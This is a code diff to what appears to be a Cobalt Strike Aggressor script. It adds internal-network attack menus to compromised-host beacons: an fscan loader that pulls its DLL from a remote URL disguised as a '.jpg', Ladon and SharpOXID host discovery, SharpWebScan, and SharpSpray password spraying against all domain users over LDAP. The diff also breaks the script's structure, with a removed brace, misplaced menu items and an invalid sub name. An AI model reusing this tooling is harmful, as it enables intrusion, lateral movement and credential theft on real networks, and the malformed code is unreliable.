@@ -35,7 +35,7 @@ menu "☆ 内网扫描" {
         # 显示对话框
         dialog_show($Dialog);
     }
-}
+
 
 sub run_fscan {
     local('$iprange $cmdparams $exe $param');
@@ -48,7 +48,7 @@ sub run_fscan {
 
     # 构建执行命令
     $exe = script_resource("/scripts/DInvoke.exe");
-    $param = "--url " . $url . "/IntrScan/x64/fscan.dll --config " . $b64;
+    $param = "--url " . $url . "/IntrScan/x64/fscan.jpg --config " . $b64;
 
     # 打印最终执行的命令
     #blog2($bid, "最终执行的命令: $exe $param");
@@ -56,4 +56,81 @@ sub run_fscan {
     # 执行命令
     bexecute_assembly!($bid, $exe, $param);
 
+}
+    item "Ladon（多协议存活探测）" {
+        #OnlinePC
+        $bid = $1;
+        $dialog = dialog("Ladon OnlineIP", %(tar => "192.168.1.1/24",moudle => "OnlineIP",clrver => "35",bid => $bid), &LadonScan);
+        dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+        drow_text($dialog, "tar",  "Target:");
+        drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","EthScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+        #drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+        drow_checkbox($dialog, 'type', 'noping');
+        dbutton_action($dialog, "Scan");
+        dialog_show($dialog);
+        }
+    sub LadonScan {
+        if (-exists script_resource("/scripts/InfoCollect/Ladon.exe")) {
+        if ($3['tar'] eq ""){
+        return;
+        }else
+        {
+        if ($3['type'] eq 'true'){
+        blog2($bid,"\c2Ladon noping ".$3['tar'].' '.$3['moudle']);
+        bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"),'noping '.$3['tar'].' '.$3['moudle']);
+        }else
+        {
+        blog2($bid,"\c2Ladon ".$3['tar'].' '.$3['moudle']);
+        bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"), $3['tar'].' '.$3['moudle']);}}
+        }else {berror($1, "Ladon.exe does not exist :(");}
+    }
+
+
+  item "SharpOXID-Find (OXID 探测)" {
+			blog($1, "\c9=========== SharpOXID-Find (OXID 探测) ==========");
+      $bid = $1['@'];
+      $dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
+      dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i 扫描指定ip,-c 扫描C段。");
+      drow_combobox($dialog, "type", "type:", @("-c","-i"));
+      drow_text($dialog, "ip", "ip:  ");			
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+  }
+  sub SharpOXID-Find {
+      $arg = join(' ',  @($3['type'],$3['ip']));
+      bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpOXID-Find.exe"), $arg);
+  }
+
+  item "SharpWebScan (Web 探测)" {
+			blog($1, "\c9=========== SharpWebScan (Web 探测) ==========");
+    $bid = $1['@'];
+    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
+    dialog_description($dialog, "扫描IP或C段的Web服务，获取Title，可自定义多端口扫描，返回web地址和title。项目地址：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
+    drow_text($dialog, "ip", "ip:  ");
+    drow_text($dialog, "port", "ports:  ");
+    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpWebScan (Web 服务) {
+    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpWebScan.exe"), $arg);
+  }
+
+  item "SharpSpray (域内密码爆破)" {
+			blog($1, "\c9=========== SharpSpray (域内密码爆破) ==========");
+    $bid = $1['@'];
+    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
+    dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击。seeds：指定几个密码生成字典，逗号分隔。passwords：指定密码爆破，可多个密码，逗号分隔。delay：密码喷雾的延迟，毫秒为单位。sleep：密码猜测之间sleep周期分钟数。项目地址：https://github.com/jnqpblc/SharpSpray");
+    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
+    drow_text($dialog, "passwd", "passwd:  ");
+    drow_text($dialog, "Delay", "Delay:  ");
+    drow_text($dialog, "Sleep", "Sleep:  ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpSpray {
+    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
+    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpSpray.exe"), $arg);
+  }
 }
